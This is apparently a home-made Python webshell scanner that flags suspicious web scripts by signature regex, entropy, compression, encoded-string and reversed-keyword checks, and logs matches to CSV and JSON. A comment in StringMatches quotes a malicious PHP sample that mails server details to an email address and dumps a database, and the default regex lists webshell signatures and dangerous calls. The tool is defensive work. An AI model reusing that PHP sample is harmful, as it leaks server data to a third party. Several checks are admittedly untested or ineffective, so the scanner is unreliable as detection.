import argparse
import time
import os
import datetime
import hashlib
import sys
import re
import platform
import getpass
import math
from collections import Counter
from io import StringIO
import gzip
import base64
import json
import socket

# TESTED AND WORKED
def GetAllFiles(dir_path):
    if os.path.isdir(dir_path):
        file_list = []
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                #append the file name to the list
                file_list.append(os.path.join(root,file))
        return file_list
    else:
        print("Wrong path input. Exit.")

# TESTED AND WORKED
def ScanExtension(file_name):
    # Input Sample
    #file_name = "Ajan.asp.txt"

    file_matches = {} # a dict
    r1 = "[^a-zA-Z0-9\-\_\.]{2,}"
    r2 = re.compile("\.[a-zA-Z0-9]{2,4}\.")
    r3 = "\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs"
    matches = re.findall(r1, file_name)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    matches = re.findall(r2, file_name)
    if len(matches) > 0:
        for i in matches:
            matches_t = re.findall(r3, i)
            if len(matches_t) > 0:
                count_dict = dict(Counter(matches).items())
                file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED
def StringMatches(file_data):
    # Input Sample
    #file_data = "<?php include(\"config.php\");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename=\"linksbox_v2.sql\"');$ra44 = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98=\"john.barker446@gmail.com\";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65\";mail($sd98, $sj98, $msg8873, \"From: $sd98\"); header('Pragma: no-cache');header('Expires: 0'); $data .= \"#phpMyAdmin MySQL-Dump \r\n\"; $data .=\"# http://phpwizard.net/phpMyAdmin/ \r\n\"; $data .=\"# http://www.phpmyadmin.net/(download page) \r\n\"; $data .= \"#$database v2.0 Database Backup\r\n\"; $data .= \"#Host: $server\r\n\"; $data .= \"#Database: $database\r\n\r\n\"; $data .= \"#Table add_links:\r\n\";$result = mysql_query(\"SELECT * FROM add_links\");while($a = mysql_fetch_array($result)) { foreach($a as $key => $value) { $a[$key] = addslashes($a[$key]); } $data .= \"INSERT INTO add_links VALUES('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n\"; } echo $data; ?>"
    
    file_matches = {}
    r = re.compile(regex)
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED
def EntropyMatches(file_data):
    # Input Sample
    # file_h = open("test_entropy.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    entropy = 0.0
    if len(file_data) < 20*1024:
        return file_matches
    file_data = file_data.replace(" ", "")
    for i in range(256): # Scan all 256 character in ASCII
        count = float(file_data.count(chr(i)))
        length = float(len(file_data))
        pX = count / length
        if pX > 0.00:
            entropy = entropy + (-pX * math.log(pX, 2))
    if entropy > 7.4:
        file_matches["Entropy"] = int(entropy*10)
    return file_matches

# TESTED AND WORKED, BUT NOT SURE
def CompressMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    compressed = gzip.compress(bytes(file_data, 'utf-8'))
    raw = gzip.decompress(compressed)
    ratio = len(compressed) / len(raw)
    if ratio > 0.74:
        file_matches["Compress"] = int(ratio * 100)
    return file_matches

# TESTED, NEARLY CORRECT =)))
def SplitMatches(file_data):
    file_matches = {}
    s = "eval|file_put_contents|base64_decode|base64|python_eval|exec|passthru|popen|proc_open|pcntl|assert|system|shell|uncompress|cmd.exe|execute|escapeshellcmd|os.popen|/bin/sh|/bin/bash|create_function|executionpolicybypass"
    split_list = s.split("|")
    result = "|"
    for i in split_list:
        result = result + i[::-1] + "|"
    reg = s + result
    reg = reg.replace("_", "\_")
    reg = reg.replace(".", "\.")
    reg = reg.replace("/", "\/")
    r = re.compile(reg)
    r1 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r2 = re.compile("[^\w\/]")
    matches1 = re.findall(r1, file_data)
    s1 = ""
    if len(matches1) > 0:
        for i in matches1:
            s1 = s1 + i
    s1 = re.sub(pattern=r2, string=s1, repl="")
    matchesr1 = re.findall(r, s1.lower())
    if len(matchesr1) > 0:
        count_dict = dict(Counter(matchesr1).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED
def Base64Matches(file_data):
    # Correct Input Sample
    # file_h = open("test_base64.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile("[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile("^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    file_matches[it1] = len(it1)
    return file_matches

# TESTED AND WORKED
def Base32Matches(file_data):
    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile("[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile("^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    file_matches[it1] = len(it1)
    return file_matches

# TESTED AND WORKED
def HexStringMatches(file_data):
    file_matches = {}
    r = re.compile(r"(?:(?:\\x[0-9A-Fa-f]{2})+)")
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED
def LongStringMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    r = re.compile("(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r1 = re.compile("[a-zA-Z0-9\+\/\=]")
    matches = re.findall(r, file_data)
    matches_result = []
    if len(matches) > 0:
        for it in matches:
            if len(it) < 64:
                continue
            matchesx = re.findall(r1, it)
            for x in matchesx:
                if len(x) == len(it)-2:
                    continue
            matches_result.append(it)
        count_dict = dict(Counter(matches_result).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED
def ProcessMatches(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    total_file_matches = {} # a dictionary
    file_matches = {} # dict
    scan_info = ""
    count = 0
    try:
        file_handle = open(file)
    except:
        return total_file_matches, 0, ""
    
    file_size = os.stat(file).st_size
    file_name = os.path.basename(file)
    # Scan Extension
    file_matches = ScanExtension(file_name)

    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + "TRUE"
        count = count + 1
    scan_info = scan_info + ","
    try:
        file_data = file_handle.read()
    except:
        return total_file_matches, file_size, ""

    # CONFUSED HERE!!!!!!!!!!!
    # cmtR = "\/\/.*|\/\*.*?\*\/|[^\u0000-\u007f]+" # RANGE OF UNICODE IN PYTHON ONLY HAVE 1 \, NOT 2
    cmtR = "[^\u0000-\u007f]+" # TEMPORARY REGEX.

    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl="")
    cmtR = re.compile("[\s\n\r\t]+")
    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl=" ")
    file_data = file_data.replace("  ", " ")
    file_data = file_data.replace(" (", "(")
    codeR = re.compile(r"<\?php(?:.*?)\?>|<script(?:.*?)<\/script>|<%(?:.*?)%>")
    matches = re.findall(pattern=codeR, string=file_data)
    if len(matches) > 0:
        file_data = ""
        count_dict = dict(Counter(matches).items())
        for i in matches:
            file_data = file_data + i
    else:
        return total_file_matches, 0, ""

    #String Matches
    file_matches = StringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Entropy Matches
    file_matches = EntropyMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Entropy": file_matches["Entropy"]})
        scan_info = scan_info + str(total_file_matches["Entropy"])
        count = count + 1
    scan_info = scan_info + ","

    # Compress Matches
    file_matches = CompressMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Compress": file_matches["Compress"]})
        scan_info = scan_info + str(total_file_matches["Compress"])
        count = count + 1
    scan_info = scan_info + ","

    # Split Matches
    file_matches = SplitMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base64 Matches
    file_matches = Base64Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base32 Matches
    file_matches = Base32Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Hex String Matches
    file_matches = HexStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Long String Matches
    file_matches = LongStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    csv_log = file + "," + scan_info.replace(" ", "")
    if count > 0:
        return total_file_matches, file_size, csv_log
    file_handle.close()
    return total_file_matches, file_size, ""

# TESTED AND WORKED
def MD5HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.md5(file_data).hexdigest()
    return result

# TESTED BUT NOT SURE
def CompressEncode(file, size):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    compressed = gzip.compress(bytes(file_data))
    img_base64 = base64.b64encode(compressed)
    return img_base64

def ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time):
    matched = 0
    cleared = 0
    logcsv = "PathName,FakeName,String,Entropy,Compress,Split,Base64,Base32,HexString,LongString,Size,MD5,Created,Modified,Accessed\n"
    totalFilesScanned = 0
    user_name = getpass.getuser()
    homedir = os.path.expanduser("~")
    hostname = socket.gethostname()

    # Scan file-by-file in file list
    for file in file_list:
        # Sample
        # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"
        
        print(file)
        totalFilesScanned = totalFilesScanned + 1
        # Process Matches
        file_matches, size, csvlog = ProcessMatches(file)

        if (len(file_matches) > 0 and size > 0):
            matched = matched + 1
        else:
            cleared = cleared + 1
            continue
        # MD5
        file_hash = MD5HashFile(file)
        # PNL (NOT CHECK)
        if pnl != "":
            try:
                db_pnl = open(output_dir + '\database' + pnl + '.txt')
            except:
                print('PnL database file reading error')
                return
            pnl_content = db_pnl.read()
            if file_hash in pnl_content:
                print("Already scan")
                continue
        # CompressEncode
        raw = CompressEncode(file, size)
        # Get created time
        if platform.system() == 'Windows':
            create_time = os.path.getctime(file)
            create_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = os.path.getmtime(file)
            modify_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = os.path.getatime(file)
            access_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(access_time))
        else: # NOT TESTED
            stat = os.stat(file)
            create_time = stat.st_ctime # We're probably on Linux.
            modify_time = stat.st_mtime
            access_time = stat.st_atime
        # Append output to logcsv
        logcsv = logcsv + csvlog + "," + str(size) + "," + file_hash + "," + create_time + "," + modify_time + "," + access_time + "\n"
        
        # JSON output
        json_data = {}
        json_data.update({"filePath": file})
        json_data.update({"size": str(size)})
        json_data.update({"md5": file_hash})
        timestamps = {}
        timestamps.update({"created": create_time})
        timestamps.update({"modified": modify_time})
        timestamps.update({"accessed": access_time})
        json_data.update({"timestamps": timestamps})
        json_data.update({"matches": file_matches})
        json_data.update({"rawContents": str(raw)})
        json_data_string = json.dumps(json_data)
        output_json_path = output_dir + "/log.json"
        output_json_handle = open(output_json_path, "a")
        output_json_handle.write(json_data_string + "\n")
        output_json_handle.close()
    
    # Write to log.csv
    output_csv_path = output_dir + "/log.csv"
    output_csv_handle = open(output_csv_path, "wb")
    output_csv_handle.write(logcsv.encode())
    output_csv_handle.close()

    # Append scan info to json
    stop_time = time.time()
    scan_time = stop_time - start_time
    scan_data = {}
    scan_data.update({"scanned": str(totalFilesScanned)})
    scan_data.update({"matches": str(matched)})
    scan_data.update({"noMatches": str(cleared)})
    scan_data.update({"directory": str(scan_dir)})
    scan_data.update({"scanDuration": str(scan_time)})
    system_info = {}
    system_info.update({"hostname": str(hostname)})
    system_info.update({"username": user_name})
    system_info.update({"userHomeDir": homedir})
    scan_data.update({"systemInfo": system_info})
    scan_data_string = json.dumps(scan_data)
    output_json_path = output_dir + "/log.json"
    output_json_handle = open(output_json_path, "a")
    output_json_handle.write(scan_data_string + "\n")
    output_json_handle.close()


# Main program
start_time = time.time()

parser = argparse.ArgumentParser(description='Webshell Scan Program')

parser.add_argument('-r', '--regex', help='Override default regex with your own', default="")

parser.add_argument('-s', '--size', help='Specify max file size to scan (default is 10 MB)', default=10)

parser.add_argument('-e', '--ext', help='Specify extensions to target. Multiple extensions should be passed with pipe separator (asp|aspx|php|cfm). Default is all extensions', default='\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs|\.ps1|\.war|\.js|\.jar')

parser.add_argument('--raw', help='If a match is found, grab the raw contents and base64 + gzip compress the file into the JSON object.', default=True)

parser.add_argument('-t', '--time', help='Scan all file created or modified after this time <yyyy-mm-dd>', default='2000-01-01')

parser.add_argument('-p', '--pnl', help='Scan for PnL', default="")

parser.add_argument('dir', help='Directory to scan for webshells')

args = parser.parse_args()
param = vars(args)
# list param: regex, size, ext, raw, time, pnl, dir. len=7
scan_dir = param.get('dir')
regex = param.get('regex')
size = param.get('size')
ext = param.get('ext')
raw = param.get('raw')
time_scan = param.get('time')
pnl = param.get('pnl')

# IMPORTANT!!! ALL REGEX ON THIS PROGRAM NEED TO USE NON-CAPTURING GROUP
if regex == "":
    regex = r"Filesman|(?:@\$_\[\]=|\$_=@\$_GET|\$_\[\+\"\"\]=)|eval\(\$(?:\w|\d)|Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|Html \= Replace\(Html\, \"\%26raquo\;\"\, \"?\"\)|pinkok|internal class reDuh|c0derz shell|md5 cracker|umer rock|Function CP\(S\,D\)\{sf\=CreateObject\(\"java\"\,\"java\.io\.File|Arguments\=xcmd\.text|asp cmd shell|Maceo|TEXTAREA id\=TEXTAREA1 name\=SqlQuery|CMD Bilgileri|sbusqlmod|php assert\(\$\_POST\[|oWshShellNet\.UserName|PHP C0nsole|rhtools|WinX Shell|system\(\$\_GET\[\'cmd\'|Successfully uploadet|\'Are you sure delete|sbusqlcmd|CFSWITCH EXPRESSION\=\#Form\.chopper|php\\HFile|\"ws\"\+\"cr\"\+\"ipt\.s\"\+\"hell\"|eval\(request\(|string rootkey|uZE Shell|Copyed success\!|InStr\(\"\$rar\$mdb\$zip\$exe\$com\$ico\$\"|Folder dosen\'t exists|Buradan Dosya Upload|echo passthru\(\$\_GET\[\'cmd\'|javascript:Bin\_PostBack|The file you want Downloadable|arguments\=\"/c \#cmd\#\"|cmdshell|AvFBP8k9CDlSP79lDl|AK-74 Security Team Web Shell|cfexecute name \= \"\#Form\.cmd\#\"|execute\(|Gamma Web Shell|System\.Reflection\.Assembly\.Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|fcreateshell|bash to execute a stack overflow|Safe Mode Shell|ASPX Shell|dingen\.php|azrailphp|\$\_POST\[\'sa\']\(\$\_POST\[\'sb\']\)|AspSpy|ntdaddy|\.HitU\. team|National Cracker Crew|eval\(base64\_decode\(\$\_REQUEST\[\'comment\'|Rootshell|geshi\\tsql\.php|tuifei\.asp|GRP WebShell|No Permission :\(|powered by zehir|will be delete all|WebFileManager Browsing|Dive Shell|diez\=server\.urlencode|@eval\(\$\_POST\[\'|ifupload\=\"ItsOk\"|eval\(request\.item|\(eval request\(|wsshn\.username|connect to reDuh|eval\(gzinflate\(base64\_decode|Ru24PostWebShell|ASPXTOOL\"|aspshell|File upload successfully you can download here|eval request\(|if\(is\_uploaded\_file\(\$HTTP|Sub RunSQLCMD|STNC WebShell|doosib|WinExec\(Target\_copy\_of\_cmd|php passthru\(getenv|win\.com cmd\.exe /c cacls\.exe|TUM HAKLARI SAKLIDIR|Created by PowerDream|Then Request\.Files\(0\)\.SaveAs\(Server\.MapPath\(Request|cfmshell|\{ Request\.Files\[0]\.SaveAs\(Server\.MapPath\(Request|\%execute\(request\(\"|php eval\(\$\_POST\[|lama\'s\'hell|RHTOOLS|data\=request\(\"dama\"|digitalapocalypse|hackingway\.tk|\.htaccess stealth web shell|strDat\.IndexOf\(\"EXEC \"|ExecuteGlobal request\(|Deleted file have finished|bin\_filern|CurrentVersionRunBackdoor|Chr\(124\)\.O\.Chr\(124\)|does not have permission to execute CMD\.EXE|G-Security Webshell|system\( \"\./findsock|configwizard|textarea style\=\"width:600\;height:200\" name\=\"cmd\"|ASPShell|repair/sam|BypasS Command eXecute|\%execute\(request\(|arguments\=\"/c \#hotmail|Coded by Loader|Call oS\.Run\(\"win\.com cmd\.exe|DESERTSUN SERVER CRASHER|ASPXSpy|cfparam name\=\"form\.shellpath\"|IIS Spy Using ADSI|p4ssw0rD|WARNING: Failed to daemonise|C0mmand line|phpinfo\(\) function has non-permissible|letaksekarang|Execute Shell Command|DXGLOBALSHIT|IISSpy|execute request\(|Chmod Ok\!|Upload Gagal|awen asp\.net|execute\(request\(\"|oSNet\.ComputerName|aspencodedll\.aspcoding|vbscript\.encode|exec\(|shell\_exec\(|popen\(|system\(|escapeshellcmd|passthru\(|pcntl\_exec|proc\_open|db\_connect|mysql\_query|execl\(|cmd\.exe|os\.popen|ls\ \-la|\/etc\/passwd|\/etc\/hosts|adodb\.connection|sqlcommandquery|shellexecute|oledbcommand|mime\-version|exif\_read\_data\(|gethostbyname\(|create\_function\(|base64\_decode\(|\-executionpolicy\ bypass"

# Get All File
file_list = GetAllFiles(scan_dir)

# Check valid regex and ext
try:
    re.compile(param.get('ext'))
    #re.compile(param.get('regex')) # WHY FAILED?
except:
    print('Non valid regex input. Exit')
    exit()

# Get platform
os_name = platform.node()
# Get user name
user_name = getpass.getuser()

output_dir = os_name + "_" + str(datetime.datetime.today().strftime('%Y-%m-%d-%H-%M'))
os.mkdir(output_dir)

# ScanFunc
ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time)
print("Scan done!")
